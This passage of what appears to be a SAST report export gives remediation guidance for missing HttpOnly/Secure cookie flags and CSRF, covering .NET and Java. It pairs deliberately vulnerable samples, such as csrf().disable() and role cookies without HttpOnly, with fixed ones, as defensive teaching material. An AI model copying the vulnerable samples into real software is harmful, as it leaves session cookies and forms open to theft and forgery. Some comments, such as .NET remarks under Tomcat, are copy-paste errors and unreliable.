"Web Server / IIS", "configuration": "web.config\n\n&lt;configuration&gt;\n  &lt;system.web&gt;\n    //missing &lt;httpCookies requireSSL=&quot;true&quot; /&gt;  this is not included in the web.config, default is false", "backend": "&lt;system.web&gt;\n    &lt;httpCookies requireSSL=&quot;true&quot;/&gt;\n  &lt;/system.web&gt;", "frontend": "If you have &lt;forms&gt; element in your system.web\\authentication block, then the non-vulnerable sample will be override, setting it back to false. \n\nIn that case we need to add the requireSSL=true attribute in the forms element. \nExample below.\n&lt;system.web&gt;\n    &lt;authentication mode=&quot;Forms&quot;&gt;\n        &lt;forms requireSSL=&quot;true&quot;&gt;\n            &lt;!-- forms content --&gt;\n        &lt;/forms&gt;\n    &lt;/authentication&gt;\n&lt;/system.web&gt;", "comments": "By default the requireSSL is false in .Net if you don't specify httpCookies attribute in the web.config file.\nBy defailt the httpOnlyCookies is false in .Net if you don't specify httpCookies attribute in the web.config file.\n\nIf the code has &lt;forms&gt; element in your system.web\\authentication block, add the requireSSL=true attribute in the forms element. \n\nSetting the HttpOnly value to true, makes this cookie accessible only to ASP.NET and not on Javascript code. If your cookie is sensitive you must set the HttpOnly to true.\nCAUTION: Carefully access in adding httpOnly to true in the web.config file because you might break a code in the application. Any javascript code that requires accessing the cookie value will not work and must be reviewed."}, {"system": "Web Server / Tomcat", "configuration": "web.xml\n\n   &lt;session-config&gt;\n    &lt;cookie-config&gt;\n        &lt;http-only&gt;false&lt;/http-only&gt;\n    &lt;/cookie-config&gt;\n &lt;/session-config&gt;\n\nIf session configuration is not made in web.xml, default value of http-only is false.", "backend": "web.xml\n\n   &lt;session-config&gt;\n    &lt;cookie-config&gt;\n        &lt;http-only&gt;true&lt;/http-only&gt;\n\t\t&lt;secure&gt;true&lt;/secure&gt;\n    &lt;/cookie-config&gt;\n &lt;/session-config&gt;", "frontend": "N/A", "comments": "By default the httpOnlyCookies is false in .Net if you don't specify httpCookies attribute in the web.config file.\n\nIf the code has &lt;forms&gt; element in your system.web\\authentication block, add the requireSSL=true attribute in the forms element. \n\nSetting the HttpOnly value to true, makes this cookie accessible only to ASP.NET and not on Javascript code. If your cookie is sensitive you must set the HttpOnly to true.\nCAUTION: Carefully access in adding httpOnly to true in the web.config file because you might break a code in the application. All functionality of the javascript code that is accessing the cookie value will not work."}, {"system": "WebServer", "configuration": "N/A", "backend": "IIS\n&lt;configuration&gt;\n &lt;system.web&gt;\n  &lt;httpCookies sameSite=&quot;Strict&quot; requireSSL=&quot;false&quot; /&gt;\n &lt;system.web&gt;\n&lt;configuration&gt;\nApache: \nhttpd.conf\nLoadModule headers_module modules/mod_headers.so\n\nHeader edit Set-Cookie ^(.*)$ $1;SameSite=strict\n\nTomcat\ncontext.xml\n&lt;Context&gt;\n&lt;CookieProcessor \n        sameSiteCookies=&quot;strict&quot; /&gt;\n&lt;/Context&gt;", "frontend": "N/A", "comments": "SameSite can be added to cookie with the mentioned configuration. If the SameSite attribute is not configured, browser will default the value of SameSite=Lax"}]}}}}, "Cookie Security: HTTPOnly not Set": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00422", "function": "userName = new Cookie(...)", "line": "222", "snippet": "Cookie userName = new Cookie(\"userName\", bean.getUserName());\n\t\t\t response.addCookie(userName);"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00423", "function": "new Cookie(...)", "line": "187", "snippet": "HttpSession session = request.getSession();\n\t    session.setAttribute(\"color\", value);\n\t    response.addCookie(new Cookie(\"color\", value)); //cwe 312 Cleartext Storage of Sensitive Information ->Improper Neutralization of CRLF Sequences in HTTP Headers, Sensitive Cookie in HTTPS Session Without 'Secure' Attribute\n\t    System.out.format(value); //CWE134_Uncontrolled_Format_String"}]}], "remediation": {"remediation": {"@id": "R.0078", "@name": "Cookie Security: HTTPOnly not Set", "@dateLastModified": "7/21/2020", "faqs": null, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "if(dr[&quot;Password&quot;].ToString() == account.Password)\n{\n   Session[&quot;user&quot;] = account.Username;\n   Session[&quot;role&quot;] = account.GetRoleDef(dr[&quot;RoleId&quot;].ToString());\n   Session[&quot;FirstName&quot;] = dr[&quot;FirstName&quot;];\n   Session[&quot;LastName&quot;] = dr[&quot;LastName&quot;];\n\n<em class=\"red\">  HttpCookie userRole = new HttpCookie(&quot;userRole&quot;,account.GetRoleDef(dr[&quot;RoleId&quot;].ToString()));\n  Response.Cookies.Add(userRole);\n</em>                              \n return View(&quot;Main&quot;);\n }\n...", "nonvulncode": "...\nif(dr[&quot;Password&quot;].ToString() == account.Password)\n{\n   Session[&quot;user&quot;] = account.Username;\n    Session[&quot;role&quot;] = account.GetRoleDef(dr[&quot;RoleId&quot;].ToString());\n    Session[&quot;FirstName&quot;] = dr[&quot;FirstName&quot;];\n    Session[&quot;LastName&quot;] = dr[&quot;LastName&quot;];\n\nHttpCookie userRole = new HttpCookie(&quot;userRole&quot;, account.GetRoleDef(dr[&quot;RoleId&quot;].ToString()));\n<em class=\"blue\">userRole.HttpOnly = true;\n</em> Response.Cookies.Add(userRole);                              \nreturn View(&quot;Main&quot;);\n }\n...", "comments": "If the requirement is to allow accessing the cookie via javascript and not to some sensitive cookie. The fix must be via backend code setting your cookie to HttpOnly to true. If all is sensitive your update must be in the web.config file.\n\nNeed to notify users of cooking, and give them the option to opt-out of receiving cookies during navigation. Cookies containing user information (IP, browser, google_ads ID, etc.) must be protected with &quot;Secure&quot;, &quot;Httponly&quot;, set and if possible, set the &quot;SameSite&quot; attribute to &quot;Strict&quot; or &quot;Lax&quot;. see reference https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies# \n\nThe General Data Privacy Regulation (GDPR) in the European Union\nThe ePrivacy Directive in the EU\nThe California Consumer Privacy Act", "impact": "Any scripted code running on the client side (browser) will lose access to the httponly variable (e.g., a local javascript cannot set or access the cookie value set to httponly).", "abstract": "Use of HttpOnly"}, {"@type": ".NET/C#/ASP", "vulncode": "&lt;system.web&gt;\n    &lt;sessionState\n   ...\n    &lt;httpCookies httpOnlyCookies=&quot;false&quot; /&gt;\n   ...\n  &lt;/system.web&gt;", "nonvulncode": "&lt;system.web&gt;\n    &lt;sessionState\n   ...\n    &lt;httpCookies httpOnlyCookies=&quot;true&quot; /&gt;\n   ...\n  &lt;/system.web&gt;", "comments": "By default the httpOnlyCookies is false in .Net if you don't specify httpCookies attribute in the web.config file.\nSetting the HttpOnly value to true, makes this cookie accessible only to ASP.NET and not on Javascript code. If your cookie is sensitive you must set the HttpOnly to true.\n<em class=\"bold\">CAUTION: </em>Carefully access in adding httpOnly to true in the web.config file because you might break a code in the application. All functionality of the javascript code that is accessing the cookie value will not work.", "impact": "Any scripted code running on the client side (browser) will lose access to the httponly variable (e.g., a local javascript cannot set or access the cookie value set to httponly).", "abstract": "Enabling httpOnlyCookies"}, {"@type": "JAVA/JSP", "vulncode": "public ModelAndView validateLogin(@ModelAttribute LoginBean bean, HttpServletRequest request,HttpSession sess, HttpServletResponse response)\n\t{\t\t\n\t\tString uname = request.getParameter(&quot;uname&quot;);\n\t\tString pwd = request.getParameter(&quot;pwd&quot;);\n\t\tModelAndView mv= new ModelAndView();\n\t\t\n\t\tbean=new LoginBean();\n\t\tbean.setUserName(uname);\n\t\tbean.setPassword(pwd);\n\t\t\t\t\n\t\tString res = dao.validateLogin(bean);\n\t\t\t\t\n\t\tif(res.equals(&quot;success&quot;)) {\n\t\t\tmv.setViewName(&quot;success&quot;);\n\t\t\tmv.addObject(&quot;msg&quot;,&quot;Welcome &quot;+bean.getUserName());\n\t\t\tmv.addObject(&quot;userObj&quot;, bean);\n\t\t\tsess.setAttribute(&quot;loginBean&quot;, bean); // Made available across controllers\n\t\t\t//sensitive information is available as cookie in client.\n\t\t\t<em class=\"red\">Cookie userRole = new Cookie(&quot;userRole&quot;,bean.getRoleID());\n\t\t\tresponse.addCookie(userRole);\n</em>\t\t\t \n\t\t\treturn new ModelAndView(&quot;success&quot;,&quot;loginBean&quot;,bean);\n\t\t} else\n\t\t{\n\t\t\tmv.setViewName(&quot;login&quot;);\n\t\t\tmv.addObject(&quot;msg&quot;,&quot;Invalid username or password&quot;);\n\t\t}\n\t\treturn mv;\n\t}", "nonvulncode": "public ModelAndView validateLogin(@ModelAttribute LoginBean bean, HttpServletRequest request,HttpSession sess, HttpServletResponse response)\n\t{\t\t\n\t\tString uname = request.getParameter(&quot;uname&quot;);\n\t\tString pwd = request.getParameter(&quot;pwd&quot;);\n\t\tModelAndView mv= new ModelAndView();\n\t\t\n\t\tbean=new LoginBean();\n\t\tbean.setUserName(uname);\n\t\tbean.setPassword(pwd);\n\t\t\t\t\n\t\tString res = dao.validateLogin(bean);\n\t\t\t\t\n\t\tif(res.equals(&quot;success&quot;)){\n\t\t\tmv.setViewName(&quot;success&quot;);\n\t\t\tmv.addObject(&quot;msg&quot;,&quot;Welcome &quot;+bean.getUserName());\n\t\t\tmv.addObject(&quot;userObj&quot;, bean);\n\t\t\tsess.setAttribute(&quot;loginBean&quot;, bean); // Made available across controllers\n\t\t\t\n\t\t\tCookie userRole = new Cookie(&quot;userRole&quot;,bean.getRoleID());\n<em class=\"blue\">userRole.setHttpOnly(true);</em>\n\t\t\tresponse.addCookie(userRole);\n\t\t\t \n\t\t\treturn new ModelAndView(&quot;success&quot;,&quot;loginBean&quot;,bean);\n\t\t}else\n\t\t{\n\t\t\tmv.setViewName(&quot;login&quot;);\n\t\t\tmv.addObject(&quot;msg&quot;,&quot;Invalid username or password&quot;);\n\t\t}\n\t\treturn mv;\n\t}", "comments": "When HttpOnly flag is used, JavaScript will not be able to read the cookie in case of XSS exploitation. Making the cookie httponly via web.xml, will ensure all the cookie has HttpOnly flag.\n\nNeed to notify users of cooking, and give them the option to opt-out of receiving cookies during navigation. Cookies containing user information (IP, browser, google_ads ID, etc.) must be protected with &quot;Secure&quot;, &quot;Httponly&quot;, set and if possible, set the &quot;SameSite&quot; attribute to &quot;Strict&quot; or &quot;Lax&quot;. see reference https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies# \n\nThe General Data Privacy Regulation (GDPR) in the European Union\nThe ePrivacy Directive in the EU\nThe California Consumer Privacy Act", "impact": "Any scripted code running on the client side (browser) will lose access to the httponly variable (e.g., a local javascript cannot set or access the cookie value set to httponly).\n\nCase 1: csrf enabled, secure enabled, via http, chrome brows<em class=\"bold\">er</em>\nwhen secure flag is set, browser will not persist/send session cookie over http, so for each request new session id will be sent by browser. Having csrf enabled, this will cause &quot;Expected csrf token not found, has your session expired&quot; issue.\n\n<em class=\"bold\">Solution:</em> When both csrf and secure flag is enabled, accessing the application via https will not have any impact.\n\n<em class=\"bold\">Case 2: csrf enabled, secure not enabled, via http, chrome/other browser</em>\nNo impact, since same session id is sent by browser.", "abstract": "Use of HttpOnly"}]}, "mitigations": {"mitigation": [{"system": "Web Server / IIS", "configuration": "web.config\n\n&lt;configuration&gt;\n  &lt;system.web&gt;\n    //missing &lt;httpCookies requireSSL=&quot;true&quot; /&gt;  this is not included in the web.config, default is false", "backend": "&lt;system.web&gt;\n    &lt;httpCookies requireSSL=&quot;true&quot;/&gt;\n  &lt;/system.web&gt;", "frontend": "If you have &lt;forms&gt; element in your system.web\\authentication block, then the non-vulnerable sample will be override, setting it back to false. \n\nIn that case we need to add the requireSSL=true attribute in the forms element. \nExample below.\n&lt;system.web&gt;\n    &lt;authentication mode=&quot;Forms&quot;&gt;\n        &lt;forms requireSSL=&quot;true&quot;&gt;\n            &lt;!-- forms content --&gt;\n        &lt;/forms&gt;\n    &lt;/authentication&gt;\n&lt;/system.web&gt;", "comments": "By default the requireSSL is false in .Net if you don't specify httpCookies attribute in the web.config file.\nBy defailt the httpOnlyCookies is false in .Net if you don't specify httpCookies attribute in the web.config file.\n\nIf the code has &lt;forms&gt; element in your system.web\\authentication block, add the requireSSL=true attribute in the forms element. \n\nSetting the HttpOnly value to true, makes this cookie accessible only to ASP.NET and not on Javascript code. If your cookie is sensitive you must set the HttpOnly to true.\nCAUTION: Carefully access in adding httpOnly to true in the web.config file because you might break a code in the application. Any javascript code that requires accessing the cookie value will not work and must be reviewed."}, {"system": "Web Server / Tomcat", "configuration": "web.xml\n\n   &lt;session-config&gt;\n    &lt;cookie-config&gt;\n        &lt;http-only&gt;false&lt;/http-only&gt;\n    &lt;/cookie-config&gt;\n &lt;/session-config&gt;\n\nIf session configuration is not made in web.xml, default value of http-only is false.", "backend": "web.xml\n\n   &lt;session-config&gt;\n    &lt;cookie-config&gt;\n        &lt;http-only&gt;true&lt;/http-only&gt;\n\t\t&lt;secure&gt;true&lt;/secure&gt;\n    &lt;/cookie-config&gt;\n &lt;/session-config&gt;", "frontend": "N/A", "comments": "By default the httpOnlyCookies is false in .Net if you don't specify httpCookies attribute in the web.config file.\n\nIf the code has &lt;forms&gt; element in your system.web\\authentication block, add the requireSSL=true attribute in the forms element. \n\nSetting the HttpOnly value to true, makes this cookie accessible only to ASP.NET and not on Javascript code. If your cookie is sensitive you must set the HttpOnly to true.\nCAUTION: Carefully access in adding httpOnly to true in the web.config file because you might break a code in the application. All functionality of the javascript code that is accessing the cookie value will not work."}, {"system": "WebServer", "configuration": "N/A", "backend": "IIS\n&lt;configuration&gt;\n &lt;system.web&gt;\n  &lt;httpCookies sameSite=&quot;Strict&quot; requireSSL=&quot;false&quot; /&gt;\n &lt;system.web&gt;\n&lt;configuration&gt;\nApache: \nhttpd.conf\nLoadModule headers_module modules/mod_headers.so\n\nHeader edit Set-Cookie ^(.*)$ $1;SameSite=strict\n\nTomcat\ncontext.xml\n&lt;Context&gt;\n&lt;CookieProcessor \n        sameSiteCookies=&quot;strict&quot; /&gt;\n&lt;/Context&gt;", "frontend": "N/A", "comments": "SameSite can be added to cookie with the mentioned configuration. If the SameSite attribute is not configured, browser will default the value of SameSite=Lax"}]}}}}, "Cross-Site Request Forgery": {"language": "JAVA", "files": [{"file": "WebContent/WEB-INF/jspViews/listStudentGradeJSON.jsp", "items": [{"id": "IN00424", "function": "FunctionPointerCall: open()", "line": "12", "snippet": "var req  = new XMLHttpRequest();\n//created json file kept in webapp folder to be read\nreq.open(\"GET\", \"user_info.json\", true); \nreq.onreadystatechange = function() {\n  if (req.status == 200 && req.readyState == 4) {"}]}, {"file": "WebContent/WEB-INF/jspViews/listStudentGrade.jsp", "items": [{"id": "IN00425", "function": "null()", "line": "31", "snippet": "</table>\n</form>\n<form id=\"listform\" action=\"studentGradeList.html\" method=\"post\">\n    <div align=\"center\">\n        <table>"}]}], "remediation": {"remediation": {"@id": "R.0029", "@name": "Cross-Site Request Forgery", "@dateLastModified": "7/23/2020", "faqs": {"faq": {"question": "Are there other business logics I can implement to prevent CSRF in depth?", "answer": "The best defense against CSRF attacks is unpredictable tokens. But there are some extra protection you can consider to sensitive applications:"}}, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "<em class=\"bold\">Controller:</em>\n        [HttpPost]\n        [CustomAuthorize(&quot;Admin&quot;)]\n        public ActionResult AddAccount(AddAccountVM account)\n        {\n            if (ModelState.IsValid)\n            {\n                Account acct = new Account();\n                if (context.Accounts.Where(r =&gt; r.Username == account.Username).FirstOrDefault() == null)\n                {\n                    acct.Username = account.Username;\n                }\n...\n            }\n            TempData[&quot;errmsg&quot;] = &quot;Cannot proces request.&quot;;\n            return View(account);\n        }\n\n<em class=\"bold\">View</em>:\n@using (Html.BeginForm()) \n{&lt;div class=&quot;form-horizontal&quot;&gt;\n    &lt;h4&gt;Create Account&lt;/h4&gt;\n    &lt;hr /&gt;\n    @Html.ValidationSummary(true, &quot;&quot;, new { @class = &quot;text-danger&quot; })\n    &lt;div class=&quot;form-group&quot;&gt;\n        @Html.LabelFor(model =&gt; model.Username, htmlAttributes: new { @class = &quot;control-label col-md-2&quot; })\n        &lt;div class=&quot;col-md-10&quot;&gt;\n            @Html.EditorFor(model =&gt; model.Username, new { htmlAttributes = new { @class = &quot;form-control&quot; } })\n            @Html.ValidationMessageFor(model =&gt; model.Username, &quot;&quot;, new { @class = &quot;text-danger&quot; })\n        &lt;/div&gt;\n    &lt;/div&gt;\n...\n&lt;/div&gt;\n}", "nonvulncode": "<em class=\"bold\">Controller:</em>\n        [HttpPost]\n        [CustomAuthorize(&quot;Admin&quot;)]\n        <em class=\"blue\">[ValidateAntiForgeryToken]\n        public ActionResult AddAccount(AddAccountVM account)\n        {\n            if (ModelState.IsValid)\n            {\n                Account acct = new Account();\n                if (context.Accounts.Where(r =&gt; r.Username == account.Username).FirstOrDefault() == null)\n                {\n                    acct.Username = account.Username;\n                }\n...\n            }\n            TempData[&quot;errmsg&quot;] = &quot;Cannot proces request.&quot;;\n            return View(account);\n     </em>   }\n\n<em class=\"bold\">View:\n</em>@using (Html.BeginForm()) \n{\n<em class=\"blue\">    @Html.AntiForgeryToken()</em>   \n&lt;div class=&quot;form-horizontal&quot;&gt;\n    &lt;h4&gt;Create Account&lt;/h4&gt;\n    &lt;hr /&gt;\n    @Html.ValidationSummary(true, &quot;&quot;, new { @class = &quot;text-danger&quot; })\n    &lt;div class=&quot;form-group&quot;&gt;\n        @Html.LabelFor(model =&gt; model.Username, htmlAttributes: new { @class = &quot;control-label col-md-2&quot; })\n        &lt;div class=&quot;col-md-10&quot;&gt;\n            @Html.EditorFor(model =&gt; model.Username, new { htmlAttributes = new { @class = &quot;form-control&quot; } })\n            @Html.ValidationMessageFor(model =&gt; model.Username, &quot;&quot;, new { @class = &quot;text-danger&quot; })\n        &lt;/div&gt;\n    &lt;/div&gt;\n...\n&lt;/div&gt;\n}", "comments": "For high sensitivity applications, consider extending anti-forgery\n\nUse unpredictable tokens (CSRF Token).\nAny important request requires a digest of the user\u2019s session credential, which is different for every user (CSRF token). \nAdd a timestamp to the token.\nLimit the lifetime for which the user\u2019s credentials and tokens are valid. \nUse step up authentication.\nDo not perform any URL rewriting.\nDo not rely only on referrer checking.\nEliminate any XSS vulnerability.\nUse CAPTCHAs.\n\n (https://docs.microsoft.com/en-us/dotnet/api/microsoft.aspnetcore.antiforgery.iantiforgeryadditionaldataprovider?view=aspnetcore-3.1) by adding data to each token (see https://docs.microsoft.com/en-us/aspnet/core/security/anti-request-forgery?view=aspnetcore-2.1#automatically-validate-antiforgery-tokens-for-unsafe-http-methods-only) \n\nSee https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html for more information and strategies on preventing against CSRF attacks", "impact": "Any controller that handles state changing requests needs to implement the [ValidateAntiForgeryToken]\nIt is recommended to add the AntiForgeryToken to verbs POST, PUT and DELETE.\nThe ideal approach is to have a different anti-forgery token per user interaction, and this is the recommendation for sensitive applications. The impacts on the web server will need to be checked with the scale performance checks (different web servers will have different performance impacts and controls to minimize it). In case the performance impact cannot be accepted, the less secure approach is to implementing the anti-forgery per session. In this case, other controls must be put in place (same origin, timestamp, etc.). \nRefer to https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html for more information.\n\nChrome browser (and maybe other browsers in the future), enforces security for the application:\nCase 1: csrf enabled, secure enabled, via https\nWhen both csrf and secure flag is enabled, accessing the application via https will not have any impact.\n\nCase 2: csrf enabled, secure enabled, via http\nwhen secure flag is set, browser will not persist/send session cookie over http, so for each request new session id will be sent by browser. Having csrf enabled, this will cause &quot;Expected csrf token not found, has your session expired&quot; issue.\nSolution: change application to be https only: When both csrf and secure flag is enabled, accessing the application via https will not have any impact.\n\nCase 3: csrf enabled, secure not enabled, via http, chrome/other browser\nApplication works, but is not secured: same session id is sent by browser in clear text, it is vulnerable to sniffing and mitm type of attacks. SAST will report this as &quot;Cookie Security: HTTPOnly not Set&quot;", "abstract": "Use of AntiForgeryToken"}, {"@type": "JAVA/JSP", "vulncode": "web.xml -- security configuration is not<em class=\"bold\"> enabled\n</em>&lt;context-param&gt;\n        &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;\n        &lt;param-value&gt;\n    \t\t/WEB-INF/sec-root-sec.xml        &lt;/param-value&gt;\n    &lt;/context-param&gt;\n\n<em class=\"bold\">Security Configuration\n</em>@EnableWebSecurity\npublic class WebSecurityConfig extends\nWebSecurityConfigurerAdapter {\n\n\t@Override\n\tprotected void configure(HttpSecurity http) throws Exception {\n\t\thttp\n\t\t\t.csrf().disable();\n\t}\n}\n\n<em class=\"bold\">View - login.jsp -- csrf token not enabled in view\n</em>&lt;form action=&quot;validate.html&quot; method=&quot;post&quot;&gt;\n&lt;table align=&quot;center&quot;&gt;\n\t\t&lt;tr style=&quot;color:red&quot;&gt;&lt;center&gt;${msg}&lt;/center&gt;&lt;/tr&gt;\n        &lt;tr&gt;\n         &lt;td&gt;Username :&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;uname&quot;&gt;&lt;/td&gt;&lt;br&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n         &lt;td&gt;Password :&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;&lt;/td&gt;&lt;br&gt;\n        &lt;/tr&gt;\n         &lt;td&gt;&lt;center&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; name=&quot;button&quot; class=&quot;btn&quot;&gt;&lt;/center&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n &lt;/table&gt;\n &lt;/form&gt;", "nonvulncode": "Configuration - Below steps need to be followed to enable security in application\n<em class=\"bold\">1) web.xml\n</em>//below filter needs to be configured\n&lt;filter&gt;\n    &lt;filter-name&gt;springSecurityFilterChain&lt;/filter-name&gt;\n    &lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt;\n&lt;/filter&gt;\n&lt;filter-mapping&gt;\n    &lt;filter-name&gt;springSecurityFilterChain&lt;/filter-name&gt;\n    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n&lt;/filter-mapping&gt;\n&lt;context-param&gt;\n        &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;\n        &lt;param-value&gt;\n    \t\t/WEB-INF/sec-root-sec.xml\n    \t\t/WEB-INF/spring-security-servlet.xml \n        &lt;/param-value&gt;\n&lt;/context-param&gt;\n<em class=\"bold\">2) spring-security-servlet.xml // In the newly added file, we should have \n</em>&lt;security:http auto-config=&quot;true&quot; disable-url-rewriting=&quot;true&quot; use-expressions=&quot;true&quot;&gt;\n    \t&lt;security:csrf/&gt;\n&lt;/security:http&gt;\n<em class=\"bold\">\nSecurity Configuration\n</em>@EnableWebSecurity\npublic class WebSecurityConfig extends\nWebSecurityConfigurerAdapter {\n\t@Override\n\tprotected void configure(HttpSecurity http) throws Exception {\n\t\t<em class=\"blue\">http.csrf();</em> //Adds CSRF support. This is activated by default when using WebSecurityConfigurerAdapter\n\t}\n}\n<em class=\"bold\">View - login.jsp\n</em>&lt;form action=&quot;validate.html&quot; method=&quot;post&quot;&gt;\n&lt;table align=&quot;center&quot;&gt;\n\t\t&lt;tr style=&quot;color:red&quot;&gt;&lt;center&gt;${msg}&lt;/center&gt;&lt;/tr&gt;\n        &lt;tr&gt;\n         &lt;td&gt;Username :&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;uname&quot;&gt;&lt;/td&gt;&lt;br&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n         &lt;td&gt;Password :&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;&lt;/td&gt;&lt;br&gt;\n        &lt;/tr&gt;\n        <em class=\"blue\">&lt;tr&gt;&lt;input type=&quot;hidden&quot; name=&quot;${_csrf.parameterName}&quot; value=&quot;${_csrf.token}&quot; /&gt;&lt;/tr&gt;    </em>    &lt;tr&gt;\n         &lt;td&gt;&lt;center&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; name=&quot;button&quot; class=&quot;btn&quot;&gt;&lt;/center&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n &lt;/table&gt;\n &lt;/form&gt;", "comments": "Starting from Spring Security 4.x's XML namespace configuration(http://www.springframework.org/schema/security/spring-security-4.0.xsd) CSRF protection is enabled by default. \nEnsure that we include the CSRF token hidden parameter in all PATCH, POST, PUT, and DELETE form submission.\n\nSecurity configuration can be done either via xml or Java configuration.\n\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\nimport org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;\n\nUse unpredictable tokens (CSRF Token).\nAny important request requires a digest of the user\u2019s session credential, which is different for every user (CSRF token). \nAdd a timestamp to the token.\nLimit the lifetime for which the user\u2019s credentials and tokens are valid. \nUse step up authentication.\nDo not perform any URL rewriting.\nDo not rely only on referrer checking.\nEliminate any XSS vulnerability.\nUse CAPTCHAs.\n\nhttps://docs.spring.io/spring-security/site/docs/5.0.5.RELEASE/reference/htmlsingle/#csrf", "impact": "No impact on functionalities and minimum to performance.\n\nIt is recommended to add the AntiForgeryToken to verbs POST, PUT and DELETE.\n\nThe ideal approach is to have a different anti-forgery token per user interaction, and this is the recommendation for sensitive applications. The impacts on the web server will need to be checked with the scale performance checks (different web servers will have different performance impacts and controls to minimize it). In case the performance impact cannot be accepted, the less secure approach is to implementing the anti-forgery per session. In this case, other controls must be put in place (same origin, timestamp, etc.) Refer to https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html for more information.\n\nIn order to enable CSRF token, the web.xml needs to be configured as well as the jsp pages.\nAll forms inside jsp pages need to be changed to generate the csrf token.\n\nChrome browser (and maybe other browsers in the future), enforces security for the application:\nCase 1: csrf enabled, secure enabled, <em class=\"bold\">via https</em>\nWhen both csrf and secure flag is enabled, accessing the application via https will not have any impact.\n\nCase 2: csrf enabled, secure enabled, <em class=\"bold\">via http</em>\nwhen secure flag is set, browser will not persist/send session cookie over http, so for each request new session id will be sent by browser. Having csrf enabled, this will cause &quot;Expected csrf token not found, has your session expired&quot; issue.\n<em class=\"bold\">Solution:</em> change application to be https only: When both csrf and secure flag is enabled, accessing the application via https will not have any impact.\n\n<em class=\"bold\">Case 3: csrf enabled, </em>secure not enabled<em class=\"bold\">, via http, chrome/other browser</em>\nApplication works, but is not secured: same session id is sent by browser in clear text, it is vulnerable to sniffing and mime type of attacks. SAST will report this as &quot;Cookie Security: HTTPOnly not Set&quot;", "abstract": "Use of CSRF token"}, {"@type": "JAVA/JSP", "vulncode": "FIle upload example\n\n<em class=\"bold\">Configuration - web.xml -- security configuration is not enabled\n</em>&lt;context-param&gt;\n        &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;\n        &lt;param-value&gt;\n    \t\t/WEB-INF/sec-root-sec.xml        &lt;/param-value&gt;\n    &lt;/context-param&gt;\n\n<em class=\"bold\">View - uploadFile.jsp</em> <em class=\"red\">-- csrf token not enabled in view</em>\n&lt;form id=&quot;fileuploadForm&quot; action=&quot;fileupload.html&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;\n    &lt;label for=&quot;file&quot;&gt;File&lt;/label&gt;\n    &lt;input id=&quot;file&quot; type=&quot;file&quot; name=&quot;file&quot; /&gt;\n    &lt;p&gt;&lt;button type=&quot;submit&quot; class=&quot;btn&quot;&gt;Upload&lt;/button&gt;&lt;/p&gt;        \n&lt;/form&gt;", "nonvulncode": "<em class=\"bold\">Configuration</em> - Below steps need to be followed to enable security in application\n<em class=\"bold\">1) Multipart resolver </em>\n<em class=\"blue\">@Bean(name = &quot;multipartResolver&quot;)\npublic CommonsMultipartResolver multipartResolver() {\n    CommonsMultipartResolver multipartResolver = new CommonsMultipartResolver();\n    multipartResolver.setMaxUploadSize(100000);\n    return multipartResolver;\n\n}\n2) view - uploadFile.jsp -- csrf token enabled</em>\n&lt;form id=&quot;fileuploadForm&quot; action=&quot;fileupload.html&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;\n\t<em class=\"blue\">&lt;input type=&quot;hidden&quot; name=&quot;${_csrf.parameterName}&quot; value=&quot;${_csrf.token}&quot; /&gt;</em>\n    &lt;label for=&quot;file&quot;&gt;File&lt;/label&gt;\n    &lt;input id=&quot;file&quot; type=&quot;file&quot; name=&quot;file&quot; /&gt;\n    &lt;p&gt;&lt;button type=&quot;submit&quot; class=&quot;btn&quot;&gt;Upload&lt;/button&gt;&lt;/p&gt;        \n&lt;/form&gt;\n<em class=\"bold\">3) web.xml\n</em>&lt;filter&gt;\n        &lt;filter-name&gt;MultipartFilter&lt;/filter-name&gt;\n        &lt;filter-class&gt;org.springframework.web.multipart.support.MultipartFilter&lt;/filter-class&gt;\n&lt;/filter&gt; \n&lt;filter-mapping&gt;\n        &lt;filter-name&gt;MultipartFilter&lt;/filter-name&gt;\n        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n&lt;/filter-mapping&gt;\n&lt;servlet&gt;\n   &lt;servlet-name&gt;spring-web&lt;/servlet-name&gt;\n   &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;\n\t\t &lt;multipart-config&gt;\n\t\t    &lt;location&gt;/tmp&lt;/location&gt;\n\t\t    &lt;max-file-size&gt;20848820&lt;/max-file-size&gt;\n\t\t    &lt;max-request-size&gt;418018841&lt;/max-request-size&gt;\n\t\t    &lt;file-size-threshold&gt;1048576&lt;/file-size-threshold&gt;\n\t\t&lt;/multipart-config&gt;\n   &lt;/servlet&gt;", "comments": "Multipart filter need to be added, which will enable csrf token for multipart file upload.\n\nMultipart resolver configuration can be implemented via java or xml 